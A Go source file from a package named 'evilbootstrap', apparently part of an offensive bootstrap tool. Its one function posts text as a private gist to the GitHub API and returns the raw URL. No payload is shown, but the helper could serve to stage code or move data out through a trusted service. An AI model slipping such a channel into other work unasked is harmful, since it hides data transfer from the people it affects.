package evilbootstrap

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
)

type gist struct {
	httpClient http.Client
	Id         string
}

type fileOut struct {
	Content string `json:"content"`
}

type gistOut struct {
	Public bool               `json:"public"`
	Files  map[string]fileOut `json:"files"`
}

type fileIn struct {
	RawUrl string `json:"raw_url"`
}

type gistIn struct {
	Files map[string]fileIn `json:"files"`
}

func CreateAnonymousGist(fileContent string) (string, error) {
	create := new(gistOut)
	create.Public = false
	create.Files = make(map[string]fileOut)
	create.Files["file"] = fileOut{fileContent}

	jsonOut, err := json.Marshal(create)
	if err != nil {
		return "", err
	}

	resp, err := http.Post("https://api.github.com/gists", "application/json", bytes.NewBuffer(jsonOut))
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		return "", fmt.Errorf("CreateAnonymousGist HTTP Status: %d", resp.StatusCode)
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	jsonIn := new(gistIn)
	err = json.Unmarshal(body, jsonIn)
	if err != nil {
		return "", err
	}

	return jsonIn.Files["file"].RawUrl, nil
}
